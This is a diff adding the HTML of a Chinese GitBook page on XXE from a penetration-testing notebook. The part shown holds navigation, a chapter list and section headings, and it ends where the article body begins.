@@ -1,0 +1,1895 @@
+
+<!DOCTYPE HTML>
+<html lang="zh-hans" >
+    <head>
+        <meta charset="UTF-8">
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <title>XXE · Java</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="description" content="">
+        <meta name="generator" content="GitBook 3.2.3">
+        <meta name="author" content="Mpy">
+        
+        
+    
+    <link rel="stylesheet" href="../../gitbook/style.css">
+
+    
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-back-to-top-button/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-expandable-chapters/expandable-chapters.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-search-pro/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-splitter/splitter.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-ancre-navigation/style/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-highlight/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-fontsettings/website.css">
+                
+            
+        
+
+    
+
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+        
+    
+    
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../../gitbook/images/apple-touch-icon-precomposed-152.png">
+    <link rel="shortcut icon" href="../../gitbook/images/favicon.ico" type="image/x-icon">
+
+    
+    <link rel="next" href="变量覆盖.html" />
+    
+    
+    <link rel="prev" href="./" />
+    
+
+    </head>
+    <body>
+        
+<div class="book">
+    <div class="book-summary">
+        
+            
+<div id="book-search-input" role="search">
+    <input type="text" placeholder="输入并搜索" />
+</div>
+
+            
+                <nav role="navigation">
+                
+
+
+<ul class="summary">
+    
+    
+
+    
+
+    
+        
+        
+    
+        <li class="chapter " data-level="1.1" data-path="../../">
+            
+                <a href="../../">
+            
+                    
+                    前言
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2" data-path="../信息收集/">
+            
+                <a href="../信息收集/">
+            
+                    
+                    信息收集
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.1" data-path="../信息收集/域名信息收集/">
+            
+                <a href="../信息收集/域名信息收集/">
+            
+                    
+                    域名信息收集
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.1.1" data-path="../信息收集/域名信息收集/WhoIs查询.html">
+            
+                <a href="../信息收集/域名信息收集/WhoIs查询.html">
+            
+                    
+                    WhoIs查询
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.1.2" data-path="../信息收集/域名信息收集/备案信息.html">
+            
+                <a href="../信息收集/域名信息收集/备案信息.html">
+            
+                    
+                    备案查询
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.1.3" data-path="../信息收集/域名信息收集/信用信息查询.html">
+            
+                <a href="../信息收集/域名信息收集/信用信息查询.html">
+            
+                    
+                    信用信息查询
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2" data-path="../信息收集/应用信息收集/">
+            
+                <a href="../信息收集/应用信息收集/">
+            
+                    
+                    应用信息收集
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.2.1" data-path="../信息收集/应用信息收集/应用信息收集.html">
+            
+                <a href="../信息收集/应用信息收集/应用信息收集.html">
+            
+                    
+                    应用收集
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.3" data-path="../信息收集/子域名信息收集/">
+            
+                <a href="../信息收集/子域名信息收集/">
+            
+                    
+                    子域名信息收集
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.3.1" data-path="../信息收集/子域名信息收集/DNS历史记录.html">
+            
+                <a href="../信息收集/子域名信息收集/DNS历史记录.html">
+            
+                    
+                    DNS历史记录
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.3.2" data-path="../信息收集/子域名信息收集/网站收集.html">
+            
+                <a href="../信息收集/子域名信息收集/网站收集.html">
+            
+                    
+                    网站收集
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.3.3" data-path="../信息收集/子域名信息收集/IP反查.html">
+            
+                <a href="../信息收集/子域名信息收集/IP反查.html">
+            
+                    
+                    IP反查
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.3.4" data-path="../信息收集/子域名信息收集/权重综合查询.html">
+            
+                <a href="../信息收集/子域名信息收集/权重综合查询.html">
+            
+                    
+                    权重综合查询
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.3.5" data-path="../信息收集/子域名信息收集/GoogleHack.html">
+            
+                <a href="../信息收集/子域名信息收集/GoogleHack.html">
+            
+                    
+                    GoogleHack
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.3.6" data-path="../信息收集/子域名信息收集/Shodan.html">
+            
+                <a href="../信息收集/子域名信息收集/Shodan.html">
+            
+                    
+                    Shodan
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.3.7" data-path="../信息收集/子域名信息收集/浏览器插件.html">
+            
+                <a href="../信息收集/子域名信息收集/浏览器插件.html">
+            
+                    
+                    浏览器插件
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.3.8" data-path="../信息收集/子域名信息收集/证书查询.html">
+            
+                <a href="../信息收集/子域名信息收集/证书查询.html">
+            
+                    
+                    证书查询
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.3.9" data-path="../信息收集/子域名信息收集/工具查找.html">
+            
+                <a href="../信息收集/子域名信息收集/工具查找.html">
+            
+                    
+                    工具查找
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4" data-path="../信息收集/指纹识别/">
+            
+                <a href="../信息收集/指纹识别/">
+            
+                    
+                    指纹识别
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.4.1" data-path="../信息收集/指纹识别/指纹识别.html">
+            
+                <a href="../信息收集/指纹识别/指纹识别.html">
+            
+                    
+                    指纹识别
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5" data-path="../信息收集/端口收集/">
+            
+                <a href="../信息收集/端口收集/">
+            
+                    
+                    端口扫描
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.5.1" data-path="../信息收集/端口收集/网络空间搜索.html">
+            
+                <a href="../信息收集/端口收集/网络空间搜索.html">
+            
+                    
+                    网络空间搜索
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.2" data-path="../信息收集/端口收集/浏览器插件.html">
+            
+                <a href="../信息收集/端口收集/浏览器插件.html">
+            
+                    
+                    浏览器插件
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.3" data-path="../信息收集/端口收集/工具.html">
+            
+                <a href="../信息收集/端口收集/工具.html">
+            
+                    
+                    工具
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.6" data-path="../信息收集/敏感文件/">
+            
+                <a href="../信息收集/敏感文件/">
+            
+                    
+                    敏感文件
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.6.1" data-path="../信息收集/敏感文件/源码泄露.html">
+            
+                <a href="../信息收集/敏感文件/源码泄露.html">
+            
+                    
+                    源码泄露
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.6.2" data-path="../信息收集/敏感文件/备份文件泄露.html">
+            
+                <a href="../信息收集/敏感文件/备份文件泄露.html">
+            
+                    
+                    备份文件泄露
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.6.3" data-path="../信息收集/敏感文件/WAF识别.html">
+            
+                <a href="../信息收集/敏感文件/WAF识别.html">
+            
+                    
+                    WAF识别
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.6.4" data-path="../信息收集/敏感文件/JS获取敏感接口.html">
+            
+                <a href="../信息收集/敏感文件/JS获取敏感接口.html">
+            
+                    
+                    JS获取敏感接口
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.6.5" data-path="../信息收集/敏感文件/目录后台.html">
+            
+                <a href="../信息收集/敏感文件/目录后台.html">
+            
+                    
+                    目录后台
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.6.6" data-path="../信息收集/敏感文件/公网网盘.html">
+            
+                <a href="../信息收集/敏感文件/公网网盘.html">
+            
+                    
+                    公网网盘
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.6.7" data-path="../信息收集/敏感文件/公开文件.html">
+            
+                <a href="../信息收集/敏感文件/公开文件.html">
+            
+                    
+                    公开文件
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.6.8" data-path="../信息收集/敏感文件/邮箱收集.html">
+            
+                <a href="../信息收集/敏感文件/邮箱收集.html">
+            
+                    
+                    邮箱收集
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.6.9" data-path="../信息收集/敏感文件/历史网站.html">
+            
+                <a href="../信息收集/敏感文件/历史网站.html">
+            
+                    
+                    历史网站
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.6.10" data-path="../信息收集/敏感文件/查找真实IP.html">
+            
+                <a href="../信息收集/敏感文件/查找真实IP.html">
+            
+                    
+                    查找真实IP
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.7" data-path="../信息收集/漏洞公共库/">
+            
+                <a href="../信息收集/漏洞公共库/">
+            
+                    
+                    漏洞公共库
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.7.1" data-path="../信息收集/漏洞公共库/国内.html">
+            
+                <a href="../信息收集/漏洞公共库/国内.html">
+            
+                    
+                    国内
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.7.2" data-path="../信息收集/漏洞公共库/国外.html">
+            
+                <a href="../信息收集/漏洞公共库/国外.html">
+            
+                    
+                    国外
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.8" data-path="../信息收集/社工库/">
+            
+                <a href="../信息收集/社工库/">
+            
+                    
+                    社工库
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.8.1" data-path="../信息收集/社工库/用户注册信息.html">
+            
+                <a href="../信息收集/社工库/用户注册信息.html">
+            
+                    
+                    用户注册信息
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.8.2" data-path="../信息收集/社工库/IP信息.html">
+            
+                <a href="../信息收集/社工库/IP信息.html">
+            
+                    
+                    IP信息
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.8.3" data-path="../信息收集/社工库/社工库.html">
+            
+                <a href="../信息收集/社工库/社工库.html">
+            
+                    
+                    社工库
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.8.4" data-path="../信息收集/社工库/工具.html">
+            
+                <a href="../信息收集/社工库/工具.html">
+            
+                    
+                    工具
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3" data-path="../SQL注入/">
+            
+                <a href="../SQL注入/">
+            
+                    
+                    SQL注入
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.1" data-path="../SQL注入/Access数据库/">
+            
+                <a href="../SQL注入/Access数据库/">
+            
+                    
+                    Access
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.1.1" data-path="../SQL注入/Access数据库/偏移注入.html">
+            
+                <a href="../SQL注入/Access数据库/偏移注入.html">
+            
+                    
+                    偏移注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.1.2" data-path="../SQL注入/Access数据库/Cookie注入.html">
+            
+                <a href="../SQL注入/Access数据库/Cookie注入.html">
+            
+                    
+                    Cookie注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.2" data-path="../SQL注入/MssQL数据库/">
+            
+                <a href="../SQL注入/MssQL数据库/">
+            
+                    
+                    MssQL
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.2.1" data-path="../SQL注入/MssQL数据库/反弹注入.html">
+            
+                <a href="../SQL注入/MssQL数据库/反弹注入.html">
+            
+                    
+                    反弹注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.2.2" data-path="../SQL注入/MssQL数据库/显错注入.html">
+            
+                <a href="../SQL注入/MssQL数据库/显错注入.html">
+            
+                    
+                    显错注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.3" data-path="../SQL注入/MySQL数据库/">
+            
+                <a href="../SQL注入/MySQL数据库/">
+            
+                    
+                    MySQL
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.3.1" data-path="../SQL注入/MySQL数据库/Head注入.html">
+            
+                <a href="../SQL注入/MySQL数据库/Head注入.html">
+            
+                    
+                    Head注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.3.2" data-path="../SQL注入/MySQL数据库/显错注入.html">
+            
+                <a href="../SQL注入/MySQL数据库/显错注入.html">
+            
+                    
+                    显错注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.3.3" data-path="../SQL注入/MySQL数据库/base64注入.html">
+            
+                <a href="../SQL注入/MySQL数据库/base64注入.html">
+            
+                    
+                    base64注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.3.4" data-path="../SQL注入/MySQL数据库/DNSLog注入.html">
+            
+                <a href="../SQL注入/MySQL数据库/DNSLog注入.html">
+            
+                    
+                    DNSLog注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.3.5" data-path="../SQL注入/MySQL数据库/报错注入.html">
+            
+                <a href="../SQL注入/MySQL数据库/报错注入.html">
+            
+                    
+                    报错注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.3.6" data-path="../SQL注入/MySQL数据库/布尔盲注.html">
+            
+                <a href="../SQL注入/MySQL数据库/布尔盲注.html">
+            
+                    
+                    布尔盲注
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.3.7" data-path="../SQL注入/MySQL数据库/堆叠查询.html">
+            
+                <a href="../SQL注入/MySQL数据库/堆叠查询.html">
+            
+                    
+                    堆叠查询
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.3.8" data-path="../SQL注入/MySQL数据库/二次注入.html">
+            
+                <a href="../SQL注入/MySQL数据库/二次注入.html">
+            
+                    
+                    二次注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.3.9" data-path="../SQL注入/MySQL数据库/宽字节注入.html">
+            
+                <a href="../SQL注入/MySQL数据库/宽字节注入.html">
+            
+                    
+                    宽字节注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.3.10" data-path="../SQL注入/MySQL数据库/延时盲注.html">
+            
+                <a href="../SQL注入/MySQL数据库/延时盲注.html">
+            
+                    
+                    延时盲注
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.4" data-path="../SQL注入/Oracle数据库/">
+            
+                <a href="../SQL注入/Oracle数据库/">
+            
+                    
+                    Oracle
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.4.1" data-path="../SQL注入/Oracle数据库/报错注入.html">
+            
+                <a href="../SQL注入/Oracle数据库/报错注入.html">
+            
+                    
+                    报错注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.4.2" data-path="../SQL注入/Oracle数据库/显错注入.html">
+            
+                <a href="../SQL注入/Oracle数据库/显错注入.html">
+            
+                    
+                    显错注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4" data-path="../跨站伪造/">
+            
+                <a href="../跨站伪造/">
+            
+                    
+                    跨站伪造
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.1" data-path="../跨站伪造/XSS.html">
+            
+                <a href="../跨站伪造/XSS.html">
+            
+                    
+                    XSS
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2" data-path="../跨站伪造/CSRF.html">
+            
+                <a href="../跨站伪造/CSRF.html">
+            
+                    
+                    CSRF
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.3" data-path="../跨站伪造/SSRF.html">
+            
+                <a href="../跨站伪造/SSRF.html">
+            
+                    
+                    SSRF
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5" data-path="../文件上传/">
+            
+                <a href="../文件上传/">
+            
+                    
+                    文件上传
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.5.1" data-path="../文件上传/文件上传.html">
+            
+                <a href="../文件上传/文件上传.html">
+            
+                    
+                    文件上传
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6" data-path="./">
+            
+                <a href="./">
+            
+                    
+                    逻辑漏洞
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter active" data-level="1.6.1" data-path="XXE.html">
+            
+                <a href="XXE.html">
+            
+                    
+                    XXE
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6.2" data-path="变量覆盖.html">
+            
+                <a href="变量覆盖.html">
+            
+                    
+                    变量覆盖
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6.3" data-path="文件包含.html">
+            
+                <a href="文件包含.html">
+            
+                    
+                    文件包含
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7" data-path="../ByPass/">
+            
+                <a href="../ByPass/">
+            
+                    
+                    ByPass
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.7.1" data-path="../ByPass/WebShell绕过.html">
+            
+                <a href="../ByPass/WebShell绕过.html">
+            
+                    
+                    ByPass
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8" data-path="../kali的使用/">
+            
+                <a href="../kali的使用/">
+            
+                    
+                    kali
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.8.1" data-path="../kali的使用/kali配置.html">
+            
+                <a href="../kali的使用/kali配置.html">
+            
+                    
+                    kali配置
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.2" data-path="../kali的使用/Ettercap.html">
+            
+                <a href="../kali的使用/Ettercap.html">
+            
+                    
+                    Ettercap
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.3" data-path="../kali的使用/HashCat.html">
+            
+                <a href="../kali的使用/HashCat.html">
+            
+                    
+                    HashCat
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.4" data-path="../kali的使用/Nmap.html">
+            
+                <a href="../kali的使用/Nmap.html">
+            
+                    
+                    Nmap
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.5" data-path="../kali的使用/SQLMap.html">
+            
+                <a href="../kali的使用/SQLMap.html">
+            
+                    
+                    SQLMap
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.6" data-path="../kali的使用/WireShark.html">
+            
+                <a href="../kali的使用/WireShark.html">
+            
+                    
+                    WireShark
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+
+    <li class="divider"></li>
+
+    <li>
+        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
+            本书使用 GitBook 发布
+        </a>
+    </li>
+</ul>
+
+
+                </nav>
+            
+        
+    </div>
+
+    <div class="book-body">
+        
+            <div class="body-inner">
+                
+                    
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href="../.." >XXE</a>
+    </h1>
+</div>
+
+
+
+
+                    <div class="page-wrapper" tabindex="-1" role="main">
+                        <div class="page-inner">
+                            
+<div id="book-search-results">
+    <div class="search-noresults">
+    
+                                <section class="normal markdown-section">
+                                
+                                <div id="anchor-navigation-ex-navbar"><i class="fa fa-anchor"></i><ul><li><span class="title-icon "></span><a href="#&#x4EC0;&#x4E48;&#x662F;xml"><b></b>&#x4EC0;&#x4E48;&#x662F;XML</a></li><ul><li><span class="title-icon "></span><a href="#&#x5B9A;&#x4E49;"><b></b>&#x5B9A;&#x4E49;</a></li><li><span class="title-icon "></span><a href="#&#x7279;&#x70B9;"><b></b>&#x7279;&#x70B9;</a></li><li><span class="title-icon "></span><a href="#&#x6587;&#x6863;&#x7ED3;&#x6784;"><b></b>&#x6587;&#x6863;&#x7ED3;&#x6784;</a></li><li><span class="title-icon "></span><a href="#dtd"><b></b>DTD</a></li><li><span class="title-icon "></span><a href="#dtd&#x4E2D;&#x7684;&#x4E00;&#x4E9B;&#x91CD;&#x8981;&#x7684;&#x5173;&#x952E;&#x5B57;"><b></b>DTD&#x4E2D;&#x7684;&#x4E00;&#x4E9B;&#x91CD;&#x8981;&#x7684;&#x5173;&#x952E;&#x5B57;</a></li><li><span class="title-icon "></span><a href="#&#x5B9E;&#x4F53;&#x7C7B;&#x522B;&#x4ECB;&#x7ECD;"><b></b>&#x5B9E;&#x4F53;&#x7C7B;&#x522B;&#x4ECB;&#x7ECD;</a></li></ul><li><span class="title-icon "></span><a href="#dtd-&#x5B9E;&#x4F53;&#x58F0;&#x660E;"><b></b>DTD &#x5B9E;&#x4F53;&#x58F0;&#x660E;</a></li><ul><li><span class="title-icon "></span><a href="#&#x5185;&#x90E8;&#x5B9E;&#x4F53;&#x58F0;&#x660E;"><b></b>&#x5185;&#x90E8;&#x5B9E;&#x4F53;&#x58F0;&#x660E;</a></li><li><span class="title-icon "></span><a href="#&#x5916;&#x90E8;&#x5B9E;&#x4F53;&#x58F0;&#x660E;"><b></b>&#x5916;&#x90E8;&#x5B9E;&#x4F53;&#x58F0;&#x660E;</a></li><li><span class="title-icon "></span><a href="#&#x53C2;&#x6570;&#x5B9E;&#x4F53;&#x58F0;&#x660E;"><b></b>&#x53C2;&#x6570;&#x5B9E;&#x4F53;&#x58F0;&#x660E;</a></li><li><span class="title-icon "></span><a href="#&#x5F15;&#x7528;&#x516C;&#x5171;&#x5B9E;&#x4F53;"><b></b>&#x5F15;&#x7528;&#x516C;&#x5171;&#x5B9E;&#x4F53;</a></li></ul><li><span class="title-icon "></span><a href="#&#x4EC0;&#x4E48;&#x662F;xml&#x5916;&#x90E8;&#x5B9E;&#x4F53;&#x653B;&#x51FB;"><b></b>&#x4EC0;&#x4E48;&#x662F;XML&#x5916;&#x90E8;&#x5B9E;&#x4F53;&#x653B;&#x51FB;?</a></li><li><span class="title-icon "></span><a href="#&#x600E;&#x4E48;&#x7504;&#x522B;&#x4E00;&#x4E2A;xml&#x5B9E;&#x4F53;&#x653B;&#x51FB;&#x6F0F;&#x6D1E;"><b></b>&#x600E;&#x4E48;&#x7504;&#x522B;&#x4E00;&#x4E2A;XML&#x5B9E;&#x4F53;&#x653B;&#x51FB;&#x6F0F;&#x6D1E;?</a></li><li><span class="title-icon "></span><a href="#xxe&#x6F0F;&#x6D1E;&#x68C0;&#x6D4B;"><b></b>xxe&#x6F0F;&#x6D1E;&#x68C0;&#x6D4B;</a></li><li><span class="title-icon "></span><a href="#xxe&#x6F0F;&#x6D1E;&#x7684;&#x5371;&#x5BB3;"><b></b>xxe&#x6F0F;&#x6D1E;&#x7684;&#x5371;&#x5BB3;</a></li><ul><li><span class="title-icon "></span><a href="#&#x8BFB;&#x53D6;&#x4EFB;&#x610F;&#x6587;&#x4EF6;"><b></b>&#x8BFB;&#x53D6;&#x4EFB;&#x610F;&#x6587;&#x4EF6;</a></li><ul><li><span class="title-icon "></span><a href="#&#x6709;&#x56DE;&#x663E;&#x60C5;&#x51B5;"><b></b>&#x6709;&#x56DE;&#x663E;&#x60C5;&#x51B5;</a></li><li><span class="title-icon "></span><a href="#&#x65E0;&#x56DE;&#x663E;&#x7684;&#x60C5;&#x51B5;"><b></b>&#x65E0;&#x56DE;&#x663E;&#x7684;&#x60C5;&#x51B5;</a></li></ul><li><span class="title-icon "></span><a href="#&#x547D;&#x4EE4;&#x6267;&#x884C;"><b></b>&#x547D;&#x4EE4;&#x6267;&#x884C;</a></li><li><span class="title-icon "></span><a href="#&#x5185;&#x7F51;&#x63A2;&#x6D4B;ssrf"><b></b>&#x5185;&#x7F51;&#x63A2;&#x6D4B;/SSRF</a></li><li><span class="title-icon "></span><a href="#&#x653B;&#x51FB;&#x5185;&#x7F51;&#x7F51;&#x7AD9;"><b></b>&#x653B;&#x51FB;&#x5185;&#x7F51;&#x7F51;&#x7AD9;</a></li><li><span class="title-icon "></span><a href="#&#x62D2;&#x7EDD;&#x670D;&#x52A1;&#x653B;&#x51FB;"><b></b>&#x62D2;&#x7EDD;&#x670D;&#x52A1;&#x653B;&#x51FB;</a></li></ul><li><span class="title-icon "></span><a href="#xxe&#x6F0F;&#x6D1E;&#x4FEE;&#x590D;&#x4E0E;&#x9632;&#x5FA1;"><b></b>XXE&#x6F0F;&#x6D1E;&#x4FEE;&#x590D;&#x4E0E;&#x9632;&#x5FA1;</a></li><ul><li><span class="title-icon "></span><a href="#&#x65B9;&#x6848;&#x4E00;"><b></b>&#x65B9;&#x6848;&#x4E00;</a></li><li><span class="title-icon "></span><a href="#&#x65B9;&#x6848;&#x4E8C;"><b></b>&#x65B9;&#x6848;&#x4E8C;</a></li></ul></ul></div><a href="#&#x4EC0;&#x4E48;&#x662F;xml" id="anchorNavigationExGoTop"><i class="fa fa-arrow-up"></i></a><h1 id="&#x4EC0;&#x4E48;&#x662F;xml"><a name="&#x4EC0;&#x4E48;&#x662F;xml" class="anchor-navigation-ex-anchor" href="#&#x4EC0;&#x4E48;&#x662F;xml"><i class="fa fa-link" aria-hidden="true"></i></a>&#x4EC0;&#x4E48;&#x662F;XML</h1>
+<p><img src="Image/&#x56FE;&#x50CF; 1.png" alt="img"></p>
+<h2 id="&#x5B9A;&#x4E49;"><a name="&#x5B9A;&#x4E49;" class="anchor-navigation-ex-anchor" href="#&#x5B9A;&#x4E49;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x5B9A;&#x4E49;</h2>
+<ul>
